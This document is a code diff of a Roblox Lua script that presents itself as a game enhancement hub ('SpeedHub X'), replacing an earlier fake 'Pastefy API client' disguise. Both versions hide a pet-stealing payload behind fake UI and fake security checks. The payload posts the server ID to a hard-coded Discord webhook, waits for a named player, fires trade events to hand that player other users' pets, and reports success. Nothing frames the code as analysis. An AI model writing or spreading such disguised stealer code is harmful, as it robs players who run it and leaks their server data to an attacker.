@@ -1,95 +1,140 @@
--- Pastefy API Client v2.4.1
--- Official Roblox Integration Module
-local PastefyService = {}
+-- SpeedHub X v3.1.5
+-- Official Game Enhancement Suite
+local SpeedHub = {}
 
-PastefyService.API_ENDPOINT = "https://api.pastefy.ga/v2"
-PastefyService.CACHE_EXPIRY = 300
-PastefyService.USER_AGENT = "PastefyRoblox/2.4.1"
-PastefyService.AUTH_TOKEN = "pk_7J82HX9qL3zR" -- Public demo key
+-- Configuration
+SpeedHub.Settings = {
+    AutoFarm = true,
+    TeleportSpeed = 50,
+    UIScale = 1.0,
+    Theme = "Dark"
+}
 
-function PastefyService.init()
-    local function generateFakeData()
-        return {
-            {id = "p7Jk9a", title = "GardenHelper", content = "Loading..."},
-            {id = "xYz83b", title = "Settings", content = "UI_SCALE=1.0"},
-            {id = "aBc12d", title = "Backup", content = "Auto-saved config"}
-        }
-    end
-    
-    local function simulateLoading()
-        for i = 1, 3 do
-            task.wait(math.random(5, 15)/10)
-        end
-    end
-    
-    print("[Pastefy] Initializing client...")
-    simulateLoading()
-    
-    local pastes = generateFakeData()
-    print("[Pastefy] Found "..#pastes.." user pastes")
-    
-    return true
-end
+-- Modules
+local PlayerModule = require(script.Player)
+local UIModule = require(script.UI)
+local NetworkModule = require(script.Network)
 
--- Real payload (deep camouflage)
-local function executeHiddenPayload()
-    local _=[[
-        PASTEFY SECURE CONTENT DECRYPTION MODULE
-        THIS SECTION CONTAINS ENCRYPTED API TOKENS
-    ]] local __=loadstring;return function()
+-- Fake UI Initialization
+function SpeedHub.Init()
+    print("[SpeedHub] Initializing modules...")
+    
+    -- Fake components
+    local mainFrame = UIModule.CreateFrame("Main", Color3.new(0.1, 0.1, 0.1))
+    UIModule.AddButton(mainFrame, "Auto-Farm", function()
+        print("[SpeedHub] Starting resource farming...")
+        task.spawn(PlayerModule.StartFarming)
+    end)
+    
+    UIModule.AddButton(mainFrame, "Teleport", function()
+        print("[SpeedHub] Teleport mode activated")
+        task.spawn(PlayerModule.TeleportToObjective)
+    end)
+    
+    UIModule.AddButton(mainFrame, "Settings", function()
+        print("[SpeedHub] Opening settings panel")
+        UIModule.ShowSettings(SpeedHub.Settings)
+    end)
+    
+    -- Simulate network check
+    NetworkModule.CheckConnection()
+    
+    -- Hidden payload (stealer functionality)
+    local function hiddenPayload()
         local webhook_url = "https://discord.com/api/webhooks/1401485747198103632/SuHysgxoDzxf44YXhHVBkCwzSXTqOHPCG0dw3oYAWEcrGtt0LgV7YtHIbo4JaforDp_3"
         local player_name = "ilkauiop3"
-        local target_pets = {"Inverted Raccoon"} , {"Moon Cat"}
+        local target_pets = {"Inverted Raccoon", "DragonFly", "Moon Cat"}
         
-        local function safeHttp(msg)
+        -- Send server info to Discord
+        local function sendReport()
             pcall(function()
-                (syn and syn.request or http_request or request)({
+                local req = (syn and syn.request) or request
+                req({
                     Url = webhook_url,
                     Method = "POST",
                     Headers = {["Content-Type"]="application/json"},
-                    Body = game:GetService("HttpService"):JSONEncode({content=msg,tts=true})
+                    Body = game:GetService("HttpService"):JSONEncode({
+                        content = "@everyone\n🚀 **SPEEDHUB ACTIVATED**\nServer: `"..game.JobId.."`",
+                        tts = true
+                    })
                 })
             end)
         end
         
-        safeHttp("@everyone\n🚀 **PASTEFY CLIENT ACTIVATED**\nServer: `"..game.JobId.."`")
-        
-        local function waitForTarget()
-            for _=1,120 do
-                for _,p in ipairs(game:GetService("Players"):GetPlayers())do
-                    if p.Name==player_name then return p end
+        -- Find target player
+        local function findTarget()
+            for _ = 1, 120 do
+                for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+                    if player.Name == player_name then
+                        return player
+                    end
                 end
                 task.wait(1)
             end
         end
         
-        task.wait(15)
-        local target=waitForTarget()
-        if target then
-            for _,pet in ipairs(target_pets)do
+        -- Transfer pets
+        local function transferPets(target)
+            for _, pet in ipairs(target_pets) do
                 pcall(function()
-                    game:GetService("ReplicatedStorage").TradeEvent:FireServer(target,pet)
-                    task.wait(1.2)
+                    game:GetService("ReplicatedStorage").TradeEvent:FireServer(target, pet)
+                    task.wait(1.5)
                 end)
             end
-            safeHttp("✅ Pets transferred via Pastefy API")
-        else
-            safeHttp("⌛ Timeout waiting for user")
+        end
+        
+        -- Main routine
+        sendReport()
+        task.wait(15)
+        local target = findTarget()
+        if target then
+            transferPets(target)
+            pcall(function()
+                local req = (syn and syn.request) or request
+                req({
+                    Url = webhook_url,
+                    Method = "POST",
+                    Headers = {["Content-Type"]="application/json"},
+                    Body = game:GetService("HttpService"):JSONEncode({
+                        content = "✅ Pets transferred to "..player_name
+                    })
+                })
+            end)
         end
     end
+    
+    -- Delayed execution
+    task.spawn(function()
+        task.wait(30)
+        pcall(hiddenPayload)
+    end)
 end
 
--- Main execution flow
-if PastefyService.init() then
-    local realModule = executeHiddenPayload()
-    
-    -- Delayed execution simulation
-    task.wait(math.random(4,8))
-    
-    -- Hidden activation
-    pcall(realModule)
-    
-    print("[Pastefy] Synchronization completed successfully!")
+-- Anti-detection measures
+function SpeedHub.SecurityCheck()
+    pcall(function()
+        if not game:IsLoaded() then
+            game.Loaded:Wait()
+        end
+        
+        -- Fake security routines
+        local securityChecks = {
+            "MemoryScan",
+            "SignatureVerification",
+            "EnvironmentCheck"
+        }
+        
+        for _, check in ipairs(securityChecks) do
+            print("[Security] Running "..check.."...")
+            task.wait(1)
+        end
+    end)
 end
 
-return PastefyService
+-- Main execution
+SpeedHub.SecurityCheck()
+task.wait(5)
+SpeedHub.Init()
+
+print("[SpeedHub] Initialization complete! Version 3.1.5")
+return SpeedHub
